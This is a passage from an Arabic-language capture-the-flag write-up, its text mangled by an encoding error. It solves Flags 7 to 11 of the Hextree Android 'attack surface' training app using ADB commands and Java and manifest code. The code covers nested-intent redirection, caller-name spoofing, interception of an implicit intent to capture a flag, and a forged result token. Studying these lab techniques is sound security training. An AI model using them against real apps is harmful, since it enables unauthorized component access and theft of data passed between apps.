-\u0026gt; nextÿå ŸàÿßŸÑŸÄ class ÿßŸÑŸÑŸä ÿ®ŸÜŸÜÿßÿØŸäŸá ŸàŸÜÿØŸäŸÑŸá ÿßŸÑŸÄ permissions ÿßŸÑŸÖÿ∑ŸÑŸàÿ®ÿ© .FLAG_GRANT_READ_URI_PERMISSION\nIntent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag6Activity\u0026#34;)); intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); startActivity(intent); Flag 7 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { String action = getIntent().getAction(); if (action == null || !action.equals(\u0026#34;OPEN\u0026#34;)) { return; } this.f.addTag(\u0026#34;OPEN\u0026#34;); } public void onNewIntent(Intent intent) { super.onNewIntent(intent); String action = intent.getAction(); if (action == null || !action.equals(\u0026#34;REOPEN\u0026#34;)) { return; } this.f.addTag(\u0026#34;REOPEN\u0026#34;); success(this); } ÿßŸÑŸÄ intent ÿßŸÑŸÖÿ≥ÿ™ŸÇÿ®ŸÑÿå ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÄ Action ŸáŸäÿ™ÿ¥ŸäŸÉ ŸÑŸÑŸÄ \u0026quot;OPEN\u0026quot;. ÿ®ÿ≥ ÿπÿ¥ÿßŸÜ ŸÜŸàÿµŸÑ ŸÑŸÄ success() ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ onNewIntent() ÿßŸÑŸÑŸä:\nÿ®Ÿäÿ¨Ÿäÿ® action string ŸÖŸÜ ÿßŸÑŸÄ intent ÿßŸÑÿ¨ÿØŸäÿØ ÿßŸÑÿ¨ÿßŸä. ŸÑŸà ÿßŸÑŸÄ action null ÿ£Ÿà ŸÖÿ¥ Ÿäÿ≥ÿßŸàŸä \u0026quot;REOPEN\u0026quot;ÿå ÿ®ŸäÿÆÿ±ÿ¨/return. ŸÑŸà ÿßŸÑŸÄ action ŸáŸà \u0026quot;REOPEN\u0026quot;ÿå ÿ®Ÿäÿ∂ŸäŸÅ ÿßŸÑŸÄ tag \u0026quot;REOPEN\u0026quot; ŸàŸäŸÜÿßÿØŸä success(this). ÿ®ÿ≥ ÿ•ÿ≤ÿßŸä ŸÜÿ¥ÿ∫ŸÑ onNewIntent()ÿü ÿßŸÑŸÄ method ÿØŸá ÿ¨ÿ≤ÿ° ŸÖŸÜ Activity lifecycle Ÿàÿ®Ÿäÿ™ÿ¥ÿ∫ŸÑ ÿ®ÿ≥ ŸÑŸÖÿß:\nÿßŸÑŸÄ activity ÿ™ŸÉŸàŸÜ ÿ¥ÿ∫ÿßŸÑÿ© ŸÅÿπŸÑÿßŸãÿå Ÿàÿ™ÿ¥ÿ™ÿ∫ŸÑ ÿ®ŸÄ intent ŸÖÿßÿ®ŸäÿπŸÖŸÑÿ¥ instance ÿ¨ÿØŸäÿØ (ŸäÿπŸÜŸä ŸÜÿ≥ÿ™ÿÆÿØŸÖ ŸÜŸÅÿ≥ ÿßŸÑÿµŸÅÿ≠ÿ© Ÿà ŸÑŸà ŸÅŸäŸáÿß ÿ®ŸäÿßŸÜÿßÿ™ ŸÜŸÉŸÖŸÑ ÿπŸÑŸäŸáÿß ŸÖÿ¥ ŸÉŸÑ ŸÖÿß ŸÜÿ®ÿπÿ™ ŸÜÿ®ÿ™ÿØŸä ŸÖŸÜ ÿßŸÑÿµŸÅÿ±) Ÿà ÿØŸá ÿ≠ÿ≥ÿ® launch mode ÿ£Ÿà intent flags. ÿßŸÑÿ≠ŸÑ # ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ADB:\nadb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN sleep 1 am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top ÿ£Ÿà ÿ≥ÿ∑ÿ± Ÿàÿßÿ≠ÿØ ÿ≤Ÿä:\nadb shell \u0026#34;am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top\u0026#34; ÿØŸá ÿ®ÿ≥ ÿ®Ÿäÿ¥ÿ∫ŸÑ shell ÿπŸÑŸâ ÿßŸÑÿ¨Ÿáÿßÿ≤ ŸàŸäÿ≥ÿ™ÿÆÿØŸÖ activity manager am ÿßŸÑŸÑŸä ÿ®Ÿäÿ¥ÿ∫ŸÑ ÿßŸÑŸÄ Flag7Activity ŸÖÿπ action OPEN ÿ®ÿπÿØŸäŸÜ Ÿäÿ™ŸàŸÇŸÅ ÿ´ÿßŸÜŸäÿ© Ÿàÿßÿ≠ÿØÿ© ÿπÿ¥ÿßŸÜ Ÿäÿ™ÿ£ŸÉÿØ ÿ•ŸÜ ÿßŸÑŸÄ activity ÿßÿ¥ÿ™ÿ∫ŸÑ Ÿà ÿßÿ™ÿ≠ŸÖŸÑ Ÿà ÿ™ŸÇÿØÿ± ÿ™ÿ™ŸÅÿßÿπŸÑ ŸÖÿπÿßŸá. ÿ®ÿπÿØŸäŸÜ Ÿäÿ¥ÿ∫ŸÑŸá ÿ™ÿßŸÜŸä ŸÖÿπ action REOPEN ŸàŸäÿ¨ÿ®ÿ±Ÿá Ÿäÿ¥ÿ™ÿ∫ŸÑ single-top ÿπÿ¥ÿßŸÜ Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑŸÄ activity ŸÖÿ¥ Ÿäÿ®ÿØÿ£ Ÿàÿßÿ≠ÿØ ÿ¨ÿØŸäÿØ\nÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ java:\nŸÑŸà ÿßŸÑŸÄ activity ÿ®Ÿäÿ®ÿØÿ£ ÿ®ÿ≥ÿ±ÿπÿ©ÿå ŸÖÿ¥ ŸÖÿ≠ÿ™ÿßÿ¨ delay: Intent firstIntent = new Intent(); firstIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); firstIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(firstIntent); Intent reopenIntent = new Intent(); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); // ŸÖÿ∑ŸÑŸàÿ® ÿπÿ¥ÿßŸÜ ŸÜÿ¥ÿ∫ŸÑ success() reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); startActivity(reopenIntent); ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ delay: Intent openIntent = new Intent(); openIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); openIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(openIntent); // 2. ÿ®ÿπÿØ delayÿå ŸÜÿ®ÿπÿ™ \u0026#34;REOPEN\u0026#34; intent ÿπÿ¥ÿßŸÜ ŸÜÿ¥ÿ∫ŸÑ onNewIntent new Handler(Looper.getMainLooper()).postDelayed(() -\u0026gt; { Intent reopenIntent = new Intent(); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); reopenIntent.addFlags( Intent.FLAG_ACTIVITY_SINGLE_TOP | // ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑŸÄ activity ÿßŸÑŸÖŸàÿ¨ŸàÿØ Intent.FLAG_ACTIVITY_CLEAR_TOP // ÿßŸÖÿ≥ÿ≠ instances ÿ™ÿßŸÜŸäÿ© ); startActivity(reopenIntent); }, 1000); // delay ÿ´ÿßŸÜŸäÿ© Ÿàÿßÿ≠ÿØÿ© ÿπÿ¥ÿßŸÜ ŸÜÿ™ÿ£ŸÉÿØ ÿ•ŸÜ ÿßŸÑŸÄ activity ÿ¥ÿ∫ÿßŸÑ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ single_Top flag: Intent firstIntent = new Intent(); firstIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); firstIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(firstIntent); try { Thread.sleep(1000); } catch (Exception e) {} Intent reopenIntent = new Intent(); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); // ŸÖÿ∑ŸÑŸàÿ® ÿπÿ¥ÿßŸÜ ŸÜÿ¥ÿ∫ŸÑ success() reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); startActivity(reopenIntent); ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ single_Top flag ŸÉŸÅÿßŸäÿ© ÿ®ÿ≥ ŸÖŸÖŸÉŸÜ ÿ™ÿ≠ÿ™ÿßÿ¨ flags ÿ≤ŸäÿßÿØÿ© ŸÅŸä ÿ≥ŸäŸÜÿßÿ±ŸäŸàŸáÿßÿ™ ŸÖÿÆÿ™ŸÑŸÅÿ© ÿ≤Ÿä ŸÅŸä ÿ≠ÿßŸÑÿßÿ™ activity ÿ™ÿßŸÜŸä Ÿäÿ≠ÿßŸàŸÑ ŸäŸÉŸàŸÜ ŸÅŸàŸÇ ŸÖŸÉÿßŸÜ ÿßŸÑÿ™ÿ∑ÿ®ŸäŸÇ ÿßŸÑÿπÿßŸàÿ≤ ÿ™Ÿáÿ¨ŸÖ ÿπŸÑŸäÿ© ÿßŸÑÿÆ ÿßŸÑÿÆ ÿßŸÑÿÆ\u0026hellip;.\nŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ£ŸÉÿ™ÿ± ÿ¥ŸàŸÅ [[android life cycle]]\nFlag 8 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # ComponentName callingActivity = getCallingActivity(); if (callingActivity != null) { if (callingActivity.getClassName().contains(\u0026#34;Hextree\u0026#34;)) { this.f.addTag(\u0026#34;calling class contains \u0026#39;Hextree\u0026#39;\u0026#34;); success(this); } else { Log.i(\u0026#34;Flag8\u0026#34;, \u0026#34;access denied\u0026#34;); setResult(0, getIntent()); } } ÿßŸÑŸÄ Activity ÿØŸá ÿ®Ÿäÿ¨Ÿäÿ® ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿπŸÜ ÿßŸÑŸÄ activity ÿßŸÑŸÑŸä ÿ¥ÿ∫ŸÑŸá ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ getCallingActivity(). ÿØŸá ÿ®Ÿäÿ±ÿ¨ÿπ ComponentName object Ÿäÿ≠ÿØÿØ ŸáŸàŸäÿ© ÿßŸÑŸÄ calling activity (ŸÖŸäŸÜ ÿßŸÑÿ®ÿßÿ¥ÿß ÿßŸÑÿ®ŸäŸÉŸÑŸÖŸÜÿß). ÿ®ÿπÿØŸäŸÜ ÿ®Ÿäÿ¥ŸäŸÉ ŸÑŸà ÿßŸÑŸÄ activity ÿßŸÑÿ≠ÿßŸÑŸä ÿßÿ™ÿ¥ÿ∫ŸÑ ŸÖŸÜ activity ÿ™ÿßŸÜŸä ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ startActivityForResult() (calling activity) ÿ®ÿπÿØŸäŸÜ ÿ®Ÿäÿ¥ŸäŸÉ ŸÑŸà ÿßÿ≥ŸÖ class ÿßŸÑÿÆÿßÿµ ÿ®ÿßŸÑŸÄ calling activity ŸÅŸäŸá string \u0026ldquo;Hextree\u0026rdquo; ÿßŸÑÿ≠ŸÑ # ÿπÿ¥ÿßŸÜ ÿ£ÿ≠ŸÑ ÿØŸá ÿπŸÖŸÑÿ™ class ŸáŸäŸÉŸàŸÜ ŸÑŸäŸá ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸÖÿ∑ŸÑŸàÿ®\npublic class Hextree extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag8Activity\u0026#34;)); startActivityForResult(intent,42); } } Flag 9 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # ComponentName callingActivity = getCallingActivity(); if (callingActivity == null || !callingActivity.getClassName().contains(\u0026#34;Hextree\u0026#34;)) { return; } Intent intent = new Intent(\u0026#34;flag\u0026#34;); this.f.addTag(intent); this.f.addTag(42); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); setResult(-1, intent); finish(); success(this); ÿßŸÑŸÄ Activity ÿØŸä ÿ®ÿ™ÿ¨Ÿäÿ® ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿπŸÜ ÿßŸÑŸÄ activity ÿßŸÑŸÑŸä ÿ¥ÿ∫ÿßŸÑŸá ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ getCallingActivity(). ÿØŸá ÿ®Ÿäÿ±ÿ¨ÿπ ComponentName object Ÿäÿ≠ÿØÿØ ŸáŸàŸäÿ© ÿßŸÑŸÄ calling activity.\nÿ®ÿπÿØŸäŸÜ ÿ®Ÿäÿ¥ŸäŸÉ ŸÑŸà ÿßŸÑŸÄ activity ÿßŸÑÿ≠ÿßŸÑŸä ÿßÿ™ÿ¥ÿ∫ŸÑ ŸÖŸÜ activity ÿ™ÿßŸÜŸä ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ startActivityForResult() (calling activity) ÿ®ÿπÿØŸäŸÜ ÿ®Ÿäÿ¥ŸäŸÉ ŸÑŸà ÿßÿ≥ŸÖ class ÿßŸÑÿÆÿßÿµ ÿ®ÿßŸÑŸÄ calling activity ŸÅŸäŸá string \u0026ldquo;Hextree\u0026rdquo; ÿßŸÑŸÅÿ±ŸÇ ÿßŸÑŸàÿ≠ŸäÿØ ÿ®ŸäŸÜ ÿØŸá ŸàÿßŸÑŸÄ Flag 8 ŸáŸà ŸáŸÜÿ∑ÿ®ŸÇ onActivityResult()\nÿßŸÑÿ≠ŸÑ # public class Hextree extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); EdgeToEdge.enable(this); setContentView(R.layout.activity_hextree); Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag9Activity\u0026#34;)); startActivityForResult(intent,42); ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -\u0026gt; { Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars()); v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom); return insets; }); } @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == 42) { Utils.showDialog(this, data); } } } Flag 10 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # if (getIntent().getAction() == null) { Toast.makeText(this, \u0026#34;Sending implicit intent with the flag\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); this.f.addTag(intent); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); try { startActivity(intent); success(this); } catch (RuntimeException e) { e.printStackTrace(); Toast.makeText(this, \u0026#34;No app found to handle the intent\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); finish(); } } ŸÑŸÖÿß intent Ÿäÿ™ÿ®ÿπÿ™ ŸÑŸÑŸÄ activity ÿØŸá ŸàŸÖÿßŸÅŸäÿ¥ action ŸÖŸÉÿ™Ÿàÿ®ÿå ŸÅŸä Toast message Ÿáÿ™ÿ∏Ÿáÿ± Ÿà intent ŸáŸäÿ™ÿπŸÖŸÑ ÿ® \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot; action Ÿàÿ¥ŸàŸäÿ© flags Ÿà data Ÿáÿ™ÿ™ÿ≠ÿ∑ ÿπÿ¥ÿßŸÜ ÿ™ÿ™ÿ®ÿπÿ™ ŸÖÿπ ÿßŸÑŸÄ intent\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag10Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; ÿ®ÿ≥ ŸÖŸÜ ÿßŸÑŸÄ xml ŸÖkŸÇÿØÿ±ÿ¥ ŸÜŸÜÿßÿØŸäŸá ŸÖÿ®ÿßÿ¥ÿ±ÿ©ÿü\nÿßŸÑÿ≠ŸÑ # ***ŸáŸÜÿß ÿßŸÑŸÄ ÿ™ÿ∑ÿ®ŸäŸÇ ÿ®Ÿäÿ≥ÿßÿπÿØŸÜÿß ŸÑŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸâ ÿ±ŸÇŸÖ challenge ŸÖŸÜŸá ŸáŸà ÿßŸÑŸáŸäÿ®ÿØÿ£Ÿá ŸÑŸäŸÜÿß ŸàŸäÿ®ÿπÿ™ ÿßŸÑŸÄ intent\nŸÜÿπŸÖŸÑ Intent-filter Ÿäÿ≥ŸÖÿπ ŸÑŸÑŸÄ action \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot; ŸàŸÅŸä ÿßŸÑŸÄ activity ŸÜÿ¨Ÿäÿ® ÿßŸÑŸÄ intent ŸàŸÜŸÇÿ±ÿß ŸÖÿ≠ÿ™ŸàÿßŸá.\n\u0026lt;activity android:name=\u0026#34;.implicitIntent\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); ÿ∑ÿ®ÿπÿß ŸÅŸä ÿßŸÑÿ≠ŸÇŸäŸÇÿ© ŸÖŸÖŸÉŸÜ ÿ™ÿ™ÿπÿßŸÖŸÑ ŸÖÿπ ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿ¨Ÿàÿß ÿßŸÑŸÄ intent Ÿà ÿ™ÿπÿØŸÑ ÿπŸÑŸäÿ© ÿßŸà ÿ™ÿ±ÿ¨ÿπÿ© Ÿà ŸáŸÉÿ∞ÿß\nÿ£Ÿà ŸÑŸà ÿßŸÑŸÄ app ŸÖÿ≥ÿßÿπÿØŸÜÿßÿ¥ ÿ•ŸäŸá ÿ±ÿ£ŸäŸÉ ŸÜÿπŸÖŸÑ ÿ≠ÿßÿ¨ÿ© ÿ™ÿßŸÜŸäÿ© ÿ≤Ÿä ÿßŸÑŸÑŸä ÿπŸÖŸÑŸÜÿßŸá ŸÅŸä Flag 6!\nŸáŸÜÿπÿØŸä ÿ£ŸàŸÑ 2 checks ŸÖŸÜ activity 5 ŸàŸÅŸä ÿßŸÑÿ™ÿßŸÑÿ™ ŸáŸÜŸÜÿßÿØŸä activity 10 ÿ®ÿ≥ ŸÖŸÜ ÿ∫Ÿäÿ± ŸÖÿß ŸÜÿ∂ŸäŸÅ flags ŸÖŸÜÿßÿ≥ÿ®ÿ©ÿå ÿßŸÑŸÄ intents Ÿáÿ™ŸÅÿ∂ŸÑ ÿ™ŸÜÿßÿØŸä ÿ®ÿπÿ∂ ÿØŸá ŸáŸäÿπŸÖŸÑ infinite loopÿå ÿπÿ¥ÿßŸÜ ÿ£ÿ≠ŸÑ ÿØŸá ÿ∂ŸÅÿ™ ÿ≠ÿßÿ¨ÿ™ŸäŸÜ\nÿßŸÑŸÄ flags ÿØŸàŸÑ ÿ®Ÿäÿ™ÿ≥ÿ™ÿÆÿØŸÖŸàÿß ÿπÿ¥ÿßŸÜ ŸÜÿ™ÿ≠ŸÉŸÖ ŸÅŸä ÿ≥ŸÑŸàŸÉ ÿßŸÑŸÄ activity stack (back stack) ŸÑŸÖÿß ŸÜÿ¥ÿ∫ŸÑ activity ÿ¨ÿØŸäÿØÿ©.\nÿßŸÑÿ£ŸàŸÑ Intent.FLAG_ACTIVITY_CLEAR_TOP :\nÿßŸÑŸáÿØŸÅ: ÿ®ŸäŸÖÿ≥ÿ≠ ŸÉŸÑ ÿßŸÑŸÄ activities ÿßŸÑŸÑŸä ŸÅŸàŸÇ ÿßŸÑŸÄ target activity ŸÅŸä ÿßŸÑŸÄ stack ÿßŸÑŸàÿ∏ŸäŸÅÿ©: ŸÑŸà ÿßŸÑŸÄ activity ŸÖŸàÿ¨ŸàÿØ ŸÅÿπŸÑÿßŸã ŸÅŸä ÿßŸÑŸÄ stackÿå ŸáŸäÿ™ÿ¨ÿßÿ® ŸÇÿØÿßŸÖ ŸÉŸÑ ÿßŸÑŸÄ activities ÿßŸÑŸÑŸä ŸÅŸàŸÇŸá Ÿáÿ™ÿ™ŸÖÿ≥ÿ≠ ŸÑŸà ÿßÿ™ÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸàÿ≠ÿØŸáÿå ŸáŸäÿπŸÖŸÑ instance ÿ¨ÿØŸäÿØ ŸÖŸÜ ÿßŸÑŸÄ activity by default (ŸäÿπŸäÿØŸá ŸÖŸÜ ÿßŸÑÿßŸàŸÑ) ÿßŸÑÿ´ÿßŸÜŸä Intent.FLAG_ACTIVITY_SINGLE_TOP :\nÿßŸÑŸáÿØŸÅ: ÿ®ŸäŸÖŸÜÿπ ÿπŸÖŸÑ instances ŸÉÿ™Ÿäÿ± ŸÖŸÜ ŸÜŸÅÿ≥ ÿßŸÑŸÄ activity ÿßŸÑŸàÿ∏ŸäŸÅÿ©: ŸÑŸà ÿßŸÑŸÄ activity ŸÖŸàÿ¨ŸàÿØÿ© ŸÅŸàŸÇ ŸÅŸä ÿßŸÑŸÄ stackÿå ŸÖÿ¥ ŸáŸäÿπŸÖŸÑ instance ÿ¨ÿØŸäÿØ ÿ®ÿØŸÑÿßŸã ŸÖŸÜ ŸÉÿØŸáÿå onNewIntent() Ÿáÿ™ŸÜÿßÿØŸâ ÿπŸÑŸâ ÿßŸÑŸÄ instance ÿßŸÑŸÖŸàÿ¨ŸàÿØ ŸÑŸà ÿßŸÑŸÄ activity ŸÖŸàÿ¨ŸàÿØ ÿ®ÿ≥ ŸÖÿ¥ ŸÅŸàŸÇÿå instance ÿ¨ÿØŸäÿØÿ© Ÿáÿ™ÿ™ÿπŸÖŸÑ Intent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag10Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); startActivity(intent); finish(); Flag 11 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); if (getIntent().getAction() == null) { Toast.makeText(this, \u0026#34;Sending implicit intent to\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); try { startActivityForResult(intent, 42); } catch (RuntimeException e) { e.printStackTrace(); Toast.makeText(this, \u0026#34;No app found to handle the intent\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); finish(); } } } public void onActivityResult(int i, int i2, Intent intent) { if (intent != null \u0026amp;\u0026amp; intent.getIntExtra(\u0026#34;token\u0026#34;, -1) == 1094795585) { this.f.addTag(1094795585); success(this); } super.onActivityResult(i, i2, intent); } ÿ≤Ÿä ÿßŸÑŸÄ Activity ÿßŸÑŸÑŸä ŸÅÿßÿ™ÿ™ ÿØŸá ÿ®Ÿäÿ¥ŸàŸÅ ŸáŸÑ intent ŸÅÿßÿ∂Ÿä ÿü ÿ®ÿ≥ ÿØŸÑŸàŸÇÿ™Ÿä ŸáŸäÿ®ÿØÿ£Ÿá ŸàŸáŸà ŸÖÿ≥ÿ™ŸÜŸä results ÿπŸÜ ÿ∑ÿ±ŸäŸÇ startActivityForResultÿå ÿßŸÑŸÄ Intent ŸÖÿ≠ÿ™ÿßÿ¨ ŸäŸÉŸàŸÜ ŸÅŸäŸá token ŸÉŸÄ extra ÿ®ŸÇŸäŸÖÿ© 1094795585\nÿßŸÑÿ≠ŸÑ # ÿßŸÑŸÄ xml ÿ≤Ÿä ÿßŸÑŸÑŸä ŸÅÿßÿ™ ŸàŸÜŸÇÿØÿ± ŸÜÿ≥ÿ™ÿÆÿØŸÖ ŸÜŸÅÿ≥ ÿßŸÑŸÄ intent (ÿßŸÑŸÑŸä ÿßÿ≥ÿ™ŸÇÿ®ŸÑŸÜÿßŸá ŸÖŸÜ activity11) ŸàŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸâ flag11 ŸÖŸÜ ÿßŸÑŸÄ app (Intent Attack Surface)\nIntent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); // ÿπÿ¥ÿßŸÜ ŸÜÿ±ÿ¨ÿπ result recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish() ÿ£Ÿà ŸÜÿßÿÆÿØ ÿßŸÑÿ∑ÿ±ŸäŸÇ ÿßŸÑÿ∑ŸàŸäŸÑ ÿßŸÑÿµÿπÿ®\nÿØŸá ŸÉÿßŸÜ ÿµÿπÿ® ŸÑÿ£ŸÜ ÿßŸÑŸÄ intent ÿßŸÑÿ¨Ÿá ŸÉÿßŸÜ ŸÅÿßÿ∂Ÿä ÿ®ÿ≥ ÿØŸá ŸÖŸÖŸÉŸÜ ŸäŸÉŸàŸÜ ŸÖÿ¥ŸÉŸÑÿ© ŸÖŸÜ ÿπŸÜÿØŸä ŸÅŸÇÿ±ÿ±ÿ™ ÿ£ŸÅÿµŸÑŸáŸÖ ÿπŸÑŸâ 2 activities (Ÿàÿßÿ≠ÿØ Ÿäÿ®ÿØÿ£ request ŸàÿßŸÑÿ™ÿßŸÜŸä Ÿäÿ≥ÿ™ŸÇÿ®ŸÑ ŸàŸäÿ®ÿπÿ™ intent ÿ™ÿßŸÜŸä)\nÿ®ÿ≥ Ÿàÿßÿ¨Ÿáÿ™ ŸÖÿ¥ÿßŸÉŸÑ ÿ≤Ÿä flag10 ŸàŸÑÿ£ŸÜ ÿßŸÑŸÄ flags ÿßŸÑŸÑŸä ÿ∂ŸÅÿ™Ÿáÿß ŸÖÿ≥ÿ≠ÿ™ instance ÿßŸÑÿÆÿßÿµ ÿ®ŸÄ activity11 ŸÅÿ≠ÿ™Ÿâ ŸÑŸà ŸÜÿßÿØŸäÿ™Ÿá Ÿàÿ®ÿπÿ™ŸÑŸä intent ŸÖŸäŸÇÿØÿ±ÿ¥ Ÿäÿ±ÿ¨ÿπŸÑŸá ŸÑÿ£ŸÜ ÿßŸÑŸÄ instance ÿßŸÑŸÖÿ≠ÿØÿØ ÿØŸá ÿßÿ™ŸÇŸÅŸÑ ŸÅÿπÿ¥ÿßŸÜ ÿ£ÿ≠ŸÑ ÿØŸá ÿ∂ŸÅÿ™ ŸÜŸÅÿ≥ ÿßŸÑŸÄ flag ÿπÿ¥ÿßŸÜ ÿ≠ÿ™Ÿâ ŸÑŸà ÿßÿ™ŸÇŸÅŸÑ Ÿäÿ™ÿ¥ÿ∫ŸÑ ÿ™ÿßŸÜŸä\nÿ∂ŸÅÿ™ method finish ÿπÿ¥ÿßŸÜ ÿ£ŸÇŸÅŸÑ ÿßŸÑŸÄ activities ÿØŸä Ÿà ÿ™ŸàŸÇŸÅ 